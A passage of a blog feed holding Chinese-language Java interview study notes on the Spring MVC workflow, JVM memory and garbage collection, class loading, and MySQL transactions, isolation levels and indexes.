href="#SpringMVC-工作流程" class="headerlink" title="SpringMVC 工作流程"></a>SpringMVC 工作流程</h2><ol><li>client 向 DispatcherServlet 发送请求</li><li>DispatcherServlet根据请求信息调用HandlerMapping ，解析请求到handle</li><li>解析到handle以后开始用HandlerAdapter适配器处理</li><li>HandlerAdapter会根据Haddler调用真正的处理器处理请求和逻辑</li><li>之后返回一个ModelAndView对象</li><li>ViewResolver会把逻辑View查询具体的视图</li><li>DispatcherServlet会把返回的Model给view 或者 Client</li></ol><h2 id="Spring-事务"><a href="#Spring-事务" class="headerlink" title="Spring 事务"></a>Spring 事务</h2><ol><li>编程式事务：在代码中用</li><li>声明式事务（xml，注解）：在配置文件中用</li></ol><blockquote><p>隔离等问题跟数据库一致</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;[文章都是搬运艿艿的]&lt;br&gt;[&lt;a href=&quot;http://svip.iocoder.cn/Java/Core/Interview/]&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://svip.iocoder.cn/Java/Core/Interview/]&lt;/a&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·jvm篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/11/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Jvm/"/>
    <id>http://runindark.com/2020/03/11/2020春招/我为阿里-Jvm/</id>
    <published>2020-03-11T07:41:05.384Z</published>
    <updated>2020-06-28T01:43:26.430Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="Java的内存区域（运行时数据区）"><a href="#Java的内存区域（运行时数据区）" class="headerlink" title="Java的内存区域（运行时数据区）"></a>Java的内存区域（运行时数据区）</h2><h3 id="线程共享区"><a href="#线程共享区" class="headerlink" title="线程共享区"></a>线程共享区</h3><ol><li>堆</li><li>方法区 （方法区中包含运行时常量池）</li></ol><h3 id="线程私有区"><a href="#线程私有区" class="headerlink" title="线程私有区"></a>线程私有区</h3><ol><li>虚拟机栈</li><li>本地方法栈</li><li>程序计数器<h3 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h3><h3 id="Java1-8之后的变化"><a href="#Java1-8之后的变化" class="headerlink" title="Java1.8之后的变化"></a>Java1.8之后的变化</h3><blockquote><p>线程共享的方法区糅合到了直接内存中的元空间</p></blockquote></li></ol><h2 id="为什么每一个线程需要一个程序计数器"><a href="#为什么每一个线程需要一个程序计数器" class="headerlink" title="为什么每一个线程需要一个程序计数器"></a>为什么每一个线程需要一个程序计数器</h2><h3 id="程序计数器的作用"><a href="#程序计数器的作用" class="headerlink" title="程序计数器的作用"></a>程序计数器的作用</h3><blockquote><p>是一块比较小的线程空间，可以当作字节码指令的指示器，字节码解释器通过程序计数器<br>来控制字节码指令，比如循环，跳转，分支，异常处理等</p></blockquote><h3 id="为啥线程需要程序计数器？"><a href="#为啥线程需要程序计数器？" class="headerlink" title="为啥线程需要程序计数器？"></a>为啥线程需要程序计数器？</h3><blockquote><p>由于线程是不断切换的，所以线程在切换后，如何进行哪一步的继续操作，是需要程序计的<br>同时程序计数器是唯一一个不会出现OutOfMemoryError的内存区域</p></blockquote><h2 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h2><blockquote><p>虚拟栈其实更通俗的讲也就是线程私有化的方法栈，用于执行线程中Java方法调用的内存模型，每次调用都是通过栈来传递的<br>其实Java内存中可以区分成栈空间，和堆空间，栈空间就是现在的虚拟机栈等，同共享<br>区的方法区一样，栈空间的栈帧依然包含局部变量表（各种基本数据类型和引用）<br>同程序计数器不同的是，虚拟机栈会出现超过栈数目的 StackOutOfFlow 以及超过内存<br>内存空间的OutOfMemoryError</p></blockquote><h3 id="Java的两种返回方式"><a href="#Java的两种返回方式" class="headerlink" title="Java的两种返回方式"></a>Java的两种返回方式</h3><ol><li>return</li><li>异常抛出</li></ol><blockquote><p>方法每一次的调用都会压栈，同时每一次返回都会出栈，上面两个方法的调用都会导致<br>出栈</p></blockquote><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><h2 id="本地方法栈是做什么的？"><a href="#本地方法栈是做什么的？" class="headerlink" title="本地方法栈是做什么的？"></a>本地方法栈是做什么的？</h2><blockquote><p>本地方法栈和虚拟机栈不同，本地方法栈是用来执行Native修饰的方法，但是虚拟机栈<br>是用来执行Java的方法，但是对于HotSpot虚拟机来说，虚拟机栈和本地方法栈合并了<br>所以一样的可以推出，本地方法栈也有自己的栈帧等，栈帧里面也相应的有局部变量表<br>操作数栈，动态链接，出口信息等</p></blockquote><h2 id="堆-（GC堆）"><a href="#堆-（GC堆）" class="headerlink" title="堆 （GC堆）"></a>堆 （GC堆）</h2><blockquote><p>堆是线程共享区的，也是Jvm管理的最大的内存空间，没有之一，几乎所有的对象实例和<br>都在这里分配内存，当然了线程中的类的实例等，都通过reference进行引用<br>由于垃圾大多数也都是由堆产生，因此也被称作为 GC堆</p></blockquote><h2 id="堆的分类"><a href="#堆的分类" class="headerlink" title="堆的分类"></a>堆的分类</h2><blockquote><p>堆中可以粗略的说有 新生代和老年代 ，新生代用完以后可能就不会再引用，所以要更多的被释放掉<br>老年代则趋于稳定，长久的存在或被使用</p></blockquote><p>更加细致的划分</p><blockquote><p>被分为Eden区和From Survivor，To Survivor<br>大部分情况下，首先会再Eden区进行空间分配，在一次垃圾回收后，对象还存活则年龄加一<br>当年龄增加到默认的15岁，则进入到老年代，当然晋升的年龄阈值是可以调节的-XX:MaxTenuringThreshold</p></blockquote><h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><blockquote><p>属于线程共享的内存区域，用于存放虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码量，主要是用于存放堆中的逻辑操作等。<br>方法区也就是永久代，永久代不用纠结就是HotSpot规定的一种规范方法区的一种实现</p></blockquote><pre><code class="java">-XX:PermSize=N <span class="comment">//⽅法区(永久代)初始⼤⼩</span>-XX:MaxPermSize=N <span class="comment">//⽅法区(永久代)最⼤⼤⼩,超过这个值将会抛出OutOfMemoryError异</span>常:java.lang.OutOfMemoryError: PermGen</code></pre><blockquote><p>不过到JDK1.8的时候已经被移除了，直接变成了元空间，也就是直接存入内存空间。</p></blockquote><h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><blockquote><p>是属于方法区的一部分，Class文件中有类型，方法，接口，版本等信息外，还有一些常量（最特征的就是final修饰的）<br>但是1.7之后这部分又去到了堆中开辟了一片空间，因此</p></blockquote><h3 id="运行时常量池包含什么"><a href="#运行时常量池包含什么" class="headerlink" title="运行时常量池包含什么"></a>运行时常量池包含什么</h3><h4 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h4><ol><li>文本字符串</li><li>final修饰的</li><li>基本数据类型的值<h4 id="符号引用"><a href="#符号引用" class="headerlink" title="符号引用"></a>符号引用</h4></li><li>类和结构完全限定名</li><li>字段名称和描述符</li><li>方法名称和描述符</li></ol><h2 id="Java对象的创建过程"><a href="#Java对象的创建过程" class="headerlink" title="Java对象的创建过程"></a>Java对象的创建过程</h2><h3 id="1-类加载检查"><a href="#1-类加载检查" class="headerlink" title="1. 类加载检查"></a>1. 类加载检查</h3><blockquote><p>从常量池中定位new的符号引用，看看找个类是不是被加载，解析，初始化过。如果没有再执行相应的类加载过程</p></blockquote><h3 id="2-分配内存"><a href="#2-分配内存" class="headerlink" title="2. 分配内存"></a>2. 分配内存</h3><blockquote><p>在堆中直接分配内存，在类加载后会直到该对象需要分配的大小，分配方法有两种（指针碰撞 和 空闲列表），分配方式的选择是由Java堆是否规整决定的</p></blockquote><h4 id="指针碰撞"><a href="#指针碰撞" class="headerlink" title="指针碰撞"></a>指针碰撞</h4><blockquote><p>就是内存如果工整，那么直接就移动指针分配空间</p></blockquote><h4 id="空闲列表"><a href="#空闲列表" class="headerlink" title="空闲列表"></a>空闲列表</h4><blockquote><p>内存不工整，类加载确定出空间后，进行“见缝插针”</p></blockquote><h4 id="线程安全问题"><a href="#线程安全问题" class="headerlink" title="线程安全问题"></a>线程安全问题</h4><h5 id="CAS乐观解决"><a href="#CAS乐观解决" class="headerlink" title="CAS乐观解决"></a>CAS乐观解决</h5><blockquote><p>就是继续利用CAS算法尝试去获取内存空间，直到成功，虚拟机就是这么做的</p></blockquote><h5 id="TLAB解决"><a href="#TLAB解决" class="headerlink" title="TLAB解决"></a>TLAB解决</h5><blockquote><p>在堆中给每个线程分配一丢丢空间，让他自己独有，分配的时候就先分配给TLAB空间，<br>但是这么做的后果就是空间浪费问题</p></blockquote><h3 id="3-初始化零值"><a href="#3-初始化零值" class="headerlink" title="3. 初始化零值"></a>3. 初始化零值</h3><blockquote><p>不包括对象头 ，就是给一一些值赋0或者null</p></blockquote><h3 id="4-设置对象头"><a href="#4-设置对象头" class="headerlink" title="4. 设置对象头"></a>4. 设置对象头</h3><blockquote><p>对象的hash码，分代年龄等，同时个synchronized锁也在对象头</p></blockquote><h3 id="5-执行init（）方法"><a href="#5-执行init（）方法" class="headerlink" title="5. 执行init（）方法"></a>5. 执行init（）方法</h3><blockquote><p>可以理解为Jvm已经创建完成，但是这里才是按照程序员的意愿开始创建，有点感觉是构造方法执行</p></blockquote><h2 id="对象的访问方式"><a href="#对象的访问方式" class="headerlink" title="对象的访问方式"></a>对象的访问方式</h2><ol><li>句柄</li><li>直接访问</li></ol><blockquote><p>二者的区别在于对于对象实例数据的处理上，句柄是先访问实例苏话剧的指针，在访问实例数据<br>直接指针是直接去Heap中去访问实例数据，不过相应的二者访问类型数据都是先去堆中访问类型数据指针再去方法区去拿到类型数据</p></blockquote><h3 id="优缺点分析"><a href="#优缺点分析" class="headerlink" title="优缺点分析"></a>优缺点分析</h3><blockquote><p>如果是读取的话，看上面过程也就直到，直接指针直接读取会更快一些，但是同样的如果<br>进行删除操作等，需要一个一个的更改数据，效率差，如果是句柄的话直接地址赋null值<br>就可以了，这个赋null值其实和c++的回收是一样的，直接赋null，就证明这一块空间又<br>可以被分配利用了</p></blockquote><h2 id="对象的分配策略"><a href="#对象的分配策略" class="headerlink" title="对象的分配策略"></a>对象的分配策略</h2><blockquote><p>大对象，长期存活对象分配到老年代，但是一般的对象有限分配到Eden区</p></blockquote><h3 id="Minor-GC，-Full-GC的区别"><a href="#Minor-GC，-Full-GC的区别" class="headerlink" title="Minor GC， Full GC的区别"></a>Minor GC， Full GC的区别</h3><blockquote><p>MinorGC也就是新生代的垃圾回收，很频繁，而且速度快<br>FullGC是指老年代的垃圾回收，不是很频繁</p></blockquote><h2 id="对象的死亡判断"><a href="#对象的死亡判断" class="headerlink" title="对象的死亡判断"></a>对象的死亡判断</h2><h3 id="程序计数器法"><a href="#程序计数器法" class="headerlink" title="程序计数器法"></a>程序计数器法</h3><blockquote><p>就是一个对象被引用一次那么计数器加一，如果引用失效那么计数器减一,如果为0，则<br>直接回收</p></blockquote><h3 id="可达性分析法"><a href="#可达性分析法" class="headerlink" title="可达性分析法"></a>可达性分析法</h3><blockquote><p>形象的来说就是以GC Root作为起点，然后查看各个对象到GCRoot是否有一条路劲可以<br>连起来，如果连不起来则直接回收</p></blockquote><h4 id="补充：一般哪些可以作为GCRoot呢："><a href="#补充：一般哪些可以作为GCRoot呢：" class="headerlink" title="补充：一般哪些可以作为GCRoot呢："></a>补充：一般哪些可以作为GCRoot呢：</h4><blockquote><p>通过System Class Loader或者Boot Class Loader加载的class对象，通过自定义类加载器加载的class不一定是GC Root<br>处于激活状态的线程<br>栈中的对象<br>JNI（Java Native Interface）栈中的对象<br>JNI中的全局对象<br>正在被用于同步的各种锁对象<br>JVM自身持有的对象，比如系统类加载器等</p></blockquote><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><blockquote><p>Java1.2之前定义引用就是reference如果指向的是内存空间的起始地址。</p></blockquote><h3 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h3><blockquote><p>大多数使用的基本都是强引用，垃圾回收器则不会去回收他，及时空间不足，直接oom，也不会去回收强引用</p></blockquote><h3 id="软引用"><a href="#软引用" class="headerlink" title="软引用"></a>软引用</h3><blockquote><p>区别于强引用，当发生内存不足的时候，才可以被垃圾回收掉。 也正是这样，可以用来<br>处理对内存比较敏感的高速缓存</p></blockquote><h3 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h3><blockquote><p>区别于软引用，只要垃圾回收器扫描到这部分视作垃圾，那么就直接回收掉<br>可以配合一个引用队列，来查看是是否被GC回收</p></blockquote><h3 id="虚引用"><a href="#虚引用" class="headerlink" title="虚引用"></a>虚引用</h3><blockquote><p>虚引用的实际用途不在乎是引用了什么对象，粗略的说可以说成一种 即将被GC回收的标<br>志，也是一种跟踪GC回收的一种方法，虚引用必须配合 引用队列来使用，即在某对象回<br>收之前，则虚引用入队，告诉Jvm该对象即将要被回收，可以在某对象被回收前做一些操作</p></blockquote><h2 id="废弃常量的判定方法"><a href="#废弃常量的判定方法" class="headerlink" title="废弃常量的判定方法"></a>废弃常量的判定方法</h2><blockquote><p>如果是在常量池，而且没用String对象引用，那么就说他是废弃常量，如果内存回收需要的话，直接清理出去</p></blockquote><h2 id="如何判定一个类的废弃"><a href="#如何判定一个类的废弃" class="headerlink" title="如何判定一个类的废弃"></a>如何判定一个类的废弃</h2><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><blockquote><p>ClassLoader是一个类加载器，它的工作是将一个类的全限名在Jvm外部进行转化成一个<br>二进制流,转成二进制流是为了Jvm读取，但是是在虚拟机外部就转化成，这样的目的是<br>让应用程序自己可以选择这个类，这也是为啥在对象回收时，Jvm Rooter可以是<br>Classroader的原因</p></blockquote><h3 id="java-lang-Class"><a href="#java-lang-Class" class="headerlink" title="java.lang.Class"></a>java.lang.Class</h3><blockquote><p>反射机制的核心，也就就是所有类自身的一个独有的镜子，在一个类被编译成.class文件的时候，在jvm中运行，会同时自动生成一个和自己创建的类想匹配的Class类</p></blockquote><h3 id="一个类废弃的判定方法"><a href="#一个类废弃的判定方法" class="headerlink" title="一个类废弃的判定方法"></a>一个类废弃的判定方法</h3><ol><li>所有的实例已经被回收掉，堆中不再有这个类的实例</li><li>该类的Classloader也已经被回收</li><li>该类对应的java.lang.class文件没有在任何地方被引用，也无法在任何地方通过反射机制来访问该类</li></ol><h2 id="垃圾回收机制的算法"><a href="#垃圾回收机制的算法" class="headerlink" title="垃圾回收机制的算法"></a>垃圾回收机制的算法</h2><h3 id="无脑清空法-–-标记清除算法"><a href="#无脑清空法-–-标记清除算法" class="headerlink" title="无脑清空法 – 标记清除算法"></a>无脑清空法 – 标记清除算法</h3><blockquote><p>标记需要回收的对象，然后标记完后，通过一轮回收直接把标记的位置回收</p><ol><li>效率差</li><li>清理完空间不连续</li></ol></blockquote><h3 id="复制填坑法-–-复制算法"><a href="#复制填坑法-–-复制算法" class="headerlink" title="复制填坑法 – 复制算法"></a>复制填坑法 – 复制算法</h3><blockquote><p>将内存空间分成两份，然后将不需要回收的内存（活着的对象）复制到另一块空间去，保证整洁</p><ol><li>需要两份一样的空间</li><li>复制的时候消耗太大</li></ol></blockquote><h3 id="洁癖整理法-–-标记整理算法"><a href="#洁癖整理法-–-标记整理算法" class="headerlink" title="洁癖整理法 – 标记整理算法"></a>洁癖整理法 – 标记整理算法</h3><blockquote><p>也是先标记，但是不同的是，标记以后直接向某一端直接移动，然后GC直接回收边界的无用的空间</p></blockquote><h3 id="分代收集算法"><a href="#分代收集算法" class="headerlink" title="分代收集算法"></a>分代收集算法</h3><blockquote><p>分配空间的空间按照新生代和老年代区别，新生代可以用复制算法，老年代的内存大，而且多，可以使用 标记整理算法，也可以酌情标记清空算法</p></blockquote><h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><h3 id="Serial-（年轻代）"><a href="#Serial-（年轻代）" class="headerlink" title="Serial （年轻代）"></a>Serial （年轻代）</h3><ol><li>单线程收集器</li><li>当进行单线程回收垃圾的时候，其它线程必须停止</li><li>但是对一个客户端的还不错，毕竟切换没那么复杂，而且单线程自然可以调用的资源更多<h3 id="ParNew-（年轻代）"><a href="#ParNew-（年轻代）" class="headerlink" title="ParNew （年轻代）"></a>ParNew （年轻代）</h3><blockquote><p>上述Serial的一个升级，其实就是升级成了多线程</p></blockquote></li><li>多线程收集</li><li>stop the world ，还是要停止所有的线程工作<h3 id="Parallel-Scavenge-（年轻代）"><a href="#Parallel-Scavenge-（年轻代）" class="headerlink" title="Parallel Scavenge （年轻代）"></a>Parallel Scavenge （年轻代）</h3><blockquote><p>为了吞吐量而减少收集时间，提高收集次数的一种收集算法，（吞吐量：程序运行时间/CPU使用时长）<br>适合执行批量处理、订单处理</p></blockquote><h3 id="Serial-Old"><a href="#Serial-Old" class="headerlink" title="Serial Old"></a>Serial Old</h3><h3 id="Parallel-Old"><a href="#Parallel-Old" class="headerlink" title="Parallel Old"></a>Parallel Old</h3></li></ol><h3 id="CMS-（老年代）"><a href="#CMS-（老年代）" class="headerlink" title="CMS （老年代）"></a>CMS （老年代）</h3><blockquote><p>HotSpot的第一款真正意义上的并发垃圾回收机制，是用的标记清除算法</p></blockquote><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><h5 id="初始标记"><a href="#初始标记" class="headerlink" title="初始标记"></a>初始标记</h5><blockquote><p>暂停掉所有的线程，标记一下与GC root相连的对象（可达性分析里面的那个GC Root）</p></blockquote><h5 id="并发标记"><a href="#并发标记" class="headerlink" title="并发标记"></a>并发标记</h5><blockquote><p>继续类似可达性分析，标记一系列可达的的队形 GC Root Trancing</p></blockquote><h5 id="重新标记"><a href="#重新标记" class="headerlink" title="重新标记"></a>重新标记</h5><blockquote><p>并发标记是并发的，重新标记是为了修正重新标记期间的用户变动</p></blockquote><h5 id="并发清除"><a href="#并发清除" class="headerlink" title="并发清除"></a>并发清除</h5><blockquote><p>开始对标记的区域做清理</p></blockquote><ol><li>对CPU资源敏感</li><li>无法清理浮动垃圾<br>3 标记清除算法有太多的空间碎片<h3 id="G1"><a href="#G1" class="headerlink" title="G1"></a>G1</h3><blockquote><p>面向服务器的垃圾回收器，针对配备多核处理起的cpu<br>宏观上是复制，微观上有标记整理算法<br>不区分内存块 Eden surviovor old在微观上还是被保留的</p></blockquote><h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><h5 id="初始标记-1"><a href="#初始标记-1" class="headerlink" title="初始标记"></a>初始标记</h5><h5 id="并发标记-1"><a href="#并发标记-1" class="headerlink" title="并发标记"></a>并发标记</h5><h5 id="最终标记"><a href="#最终标记" class="headerlink" title="最终标记"></a>最终标记</h5><h5 id="筛选回收"><a href="#筛选回收" class="headerlink" title="筛选回收"></a>筛选回收</h5></li></ol><blockquote><p>过程其实大同小异，相比于CMS其实更多的在于标记的时候多了Remember Set，到了最终标记还有Remeber Set Log合并到了Remeber Set因此避免了浮动垃圾问题<br>Region在宏观是其实是复制原则，但是在Region的内部其实是标记整理算法<br>Region内部除了Eden s0 s1 old 还有超大对象，面对超大对象，会选择移动老年代的<br>对象来为超大内存的对象提供内存</p></blockquote><h2 id="Jvm类加载模式"><a href="#Jvm类加载模式" class="headerlink" title="Jvm类加载模式"></a>Jvm类加载模式</h2><ol><li>加载<blockquote><p>这个阶段会在内存中生成一个代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据的入口</p></blockquote></li><li>验证<blockquote><p>了确保 Class 文件的字节流中包含的信息是否符合当前虚拟机的要求</p></blockquote></li><li>准备<blockquote><p>是正式为类变量分配内存并设置类变量的初始值阶段，即在方法区中分配这些变量所使用的内存空间。</p></blockquote></li><li>解析<blockquote><p>虚拟机将常量池中的符号引用替换为直接引用的过程</p></blockquote></li><li>初始化<blockquote><p>初始化阶段是类加载最后一个阶段，前面的类加载阶段之后，除了在加载阶段可以自定义类加载器以外，其它操作都由 JVM 主导。到了初始阶段，才开始真正执行类中定义的 Java 程序代码。</p></blockquote></li></ol><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><ol><li>启动类加载器<blockquote><p>负责加载 JAVA_HOME\lib 目录中的，或通过-Xbootclasspath 参数指定路径中的，且被<br>虚拟机认可（按文件名识别，如 rt.jar）的类</p></blockquote></li><li>扩展类加载器<blockquote><p>负责加载 JAVA_HOME\lib\ext 目录中的，或通过 java.ext.dirs 系统变量指定路径中的类<br>库</p></blockquote></li><li><p>应用程序类加载器</p><blockquote><p>负责加载用户路径（classpath）上的类库<br>利用双亲委派模型进行类的加载，通过继承java.lang.classloader实现自定义类加载器</p></blockquote><pre><code>                启动类加载器（Bootstrap ClassLoader）                                /\                                ||                扩展类加载器 （Extension ClassLoader）                                /\                                ||                应用程序类加载器 （Application ClassLoader）                        /\                  /\                        ||                  ||自定义加载器（User ClassLoader）    自定义加载器（UserClassLoader）</code></pre></li></ol><h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><blockquote><p>当一个类收到类加载的请求，他首先不会尝试自己去加载这个类，而是把请求委托给父类去完成，每一层的类加载器都是如此（如上图，箭头向上），因此最终所有的加载类都应该送到启动类加载器去完成，只有当父类的加载器返回自己无法加载这个请求的时候，子类加载器才会自己尝试去加载。<br>采用双亲委派的一个好处是比如加载位于 rt.jar 包中的类 java.lang.Object，不管是哪个加载<br>器加载这个类，最终都是委托给顶层的启动类加载器进行加载，这样就保证了使用不同的类加载<br>器最终得到的都是同样一个 Object 对象</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·mysql篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/10/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-mysql/"/>
    <id>http://runindark.com/2020/03/10/2020春招/我为阿里-mysql/</id>
    <published>2020-03-10T03:03:04.084Z</published>
    <updated>2020-06-28T01:43:26.639Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="Mysql事务的特性-ACID"><a href="#Mysql事务的特性-ACID" class="headerlink" title="Mysql事务的特性 - ACID"></a>Mysql事务的特性 - ACID</h2><h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><blockquote><p>和线程是一样的，意思就是要么成功，要么失败 =》 事务要么执行成功，要么执行失败</p></blockquote><h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><blockquote><p>从一个一致性到另一个一致性是传递的，就是一个业务流程，一个环节不是一致性，下一个环节就会失败</p></blockquote><h3 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h3><blockquote><p>数据库事务和事务之间是隔离的，也就是说事务A看不到事务B，相应的事务B也不晓得事务A干啥</p></blockquote><h3 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h3><blockquote><p>也就是说，只要事务存入数据库的就是永久存在的，哪怕数据库出异常了，数据也还在</p></blockquote><h2 id="Mysql事务的出现的问题"><a href="#Mysql事务的出现的问题" class="headerlink" title="Mysql事务的出现的问题"></a>Mysql事务的出现的问题</h2><h3 id="事务会发生的意外"><a href="#事务会发生的意外" class="headerlink" title="事务会发生的意外"></a>事务会发生的意外</h3><h4 id="脏读（Select-没有规矩）"><a href="#脏读（Select-没有规矩）" class="headerlink" title="脏读（Select 没有规矩）"></a>脏读（Select 没有规矩）</h4><blockquote><p>事务A插入了一个数据，但是人家事务A没有提交。结果事务B他没有规矩，他查了一下表，结果发现了事务A插入的数据。这就是脏读</p></blockquote><h4 id="不可重复读（Update-没有规矩）"><a href="#不可重复读（Update-没有规矩）" class="headerlink" title="不可重复读（Update 没有规矩）"></a>不可重复读（Update 没有规矩）</h4><blockquote><p>事务A查询一条数据是A，但是事务b他没有规矩，他更新了数据A变成了B，当事务A再查这条数据的时候，发现变成了B，这就是不可重复读</p></blockquote><h4 id="幻读-（Insert-Delete-没有规矩）"><a href="#幻读-（Insert-Delete-没有规矩）" class="headerlink" title="幻读 （Insert Delete 没有规矩）"></a>幻读 （Insert Delete 没有规矩）</h4><blockquote><p>事务A差某表，查出A条数据，事务B这时候删了几条数据，事务A此刻又去读了一下，发现数据少了，这就是不可重复读。</p></blockquote><h3 id="数据库隔离级别"><a href="#数据库隔离级别" class="headerlink" title="数据库隔离级别"></a>数据库隔离级别</h3><h4 id="未提交读"><a href="#未提交读" class="headerlink" title="未提交读"></a>未提交读</h4><blockquote><p>事务之间可以读取到事务未提交的数据 （完美的符合了上面出现的所有问题）</p></blockquote><h4 id="提交读"><a href="#提交读" class="headerlink" title="提交读"></a>提交读</h4><blockquote><p>顾名思义就是可以读取到已经提交的数据，引申一下，里面涉及到的一种“快照读”，也就是读历史确定的版本</p></blockquote><h4 id="可重复读"><a href="#可重复读" class="headerlink" title="可重复读"></a>可重复读</h4><blockquote><p>也就是悲观锁读，当前的一个事务如果读取到该数据，那么给当前读取上锁，其它事务将无法再获取该数据，但是这个并不能限制事务继续插入数据，所以就会<br>引起幻读</p></blockquote><h4 id="串行化"><a href="#串行化" class="headerlink" title="串行化"></a>串行化</h4><blockquote><p>顾名思义就是一个一个慢慢来，一次只能来一个，活该这么慢</p></blockquote><h2 id="Mysql的存储引擎"><a href="#Mysql的存储引擎" class="headerlink" title="Mysql的存储引擎"></a>Mysql的存储引擎</h2><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><blockquote><p>Mysql所默认的一种存储引擎，满足ACID的事务要求，他使用了“一次性非锁定性读”（也就是给数据读取等添加版本，这个里面有些和上述的快照读概念差不<br>多）</p></blockquote><h3 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h3><blockquote><p>依靠逗号来分割数据的一种存储方式</p></blockquote><h4 id="InnoDB的一些优点缺点"><a href="#InnoDB的一些优点缺点" class="headerlink" title="InnoDB的一些优点缺点"></a>InnoDB的一些优点缺点</h4><ol><li>行锁粒度，粒度更小，更适合并发场景</li><li>支持事务，有外键</li><li>缺点： 缺点也很明显不支持全文搜索，可以用es搜索</li></ol><h2 id="Mysql数据库索引"><a href="#Mysql数据库索引" class="headerlink" title="Mysql数据库索引"></a>Mysql数据库索引</h2><h3 id="什么是索引"><a href="#什么是索引" class="headerlink" title="什么是索引"></a>什么是索引</h3><blockquote><p>可以理解成一种排序后的数据结构，通过节点存储索引，之后在查到找相应的结果，通过数据结构加速，比如用二叉树，那么就可以通过节点左右比较减少<br>遍历查找的次数，当然了如果1 2 3 4 5 6 就会变成链表，如果是红黑树则解决了这个问题，但是会导致深度过深，因此使用B+树，降低深度，添加广度</p></blockquote><h3 id="常用的功能索引"><a href="#常用的功能索引" class="headerlink" title="常用的功能索引"></a>常用的功能索引</h3><h4 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h4><blockquote><p>就是最基本的添加一个索引，用于加速查找</p></blockquote><h4 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h4><blockquote><p>列值必须唯一，可以为空值，加速查找</p></blockquote><h4 id="主键索引"><a href="#主键索引" class="headerlink" title="主键索引"></a>主键索引</h4><blockquote><p>利用主键作为索引，而且不可以为空，加速查找</p></blockquote><h4 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h4><blockquote><p>就是查查找的数据也是索引值</p></blockquote><h4 id="组合索引"><a href="#组合索引" class="headerlink" title="组合索引"></a>组合索引</h4><blockquote><p>几列合并成一个索引，但是遵循最左原则</p></blockquote><h4 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h4><blockquote><p>全文分词查找，innoDB是做不到的，需要第三方，比如es等</p></blockquote><h3 id="使用索引存在的问题"><a href="#使用索引存在的问题" class="headerlink" title="使用索引存在的问题"></a>使用索引存在的问题</h3><blockquote><p>使用索引的时候不可以随便使用，过度的使用索引会导致消耗大量的资源，热点核心业务的数据应该多使用索引<br>索引会浪费磁盘空间，不要创建非必要的索引,插入、更新、删除需要维护索引，带来额外的开销,索引过多，修改表的时候重构索引性能差<br>但是索引使用的时候可以减少查询次数，提高效率</p></blockquote><h2 id="Sql-的查询顺序"><a href="#Sql-的查询顺序" class="headerlink" title="Sql 的查询顺序"></a>Sql 的查询顺序</h2><ol><li>from 从哪个表查询</li><li>where 初步过滤条件</li><li>group by 过滤后进行分组[重点]</li><li>having 对分组后的数据进行二次过滤[重点]</li><li>select 查看哪些结果字段</li><li>order by 按照怎样的顺序进行排序返回[重点]</li></ol></the>]]></content>
    
    <summary type="html">
    
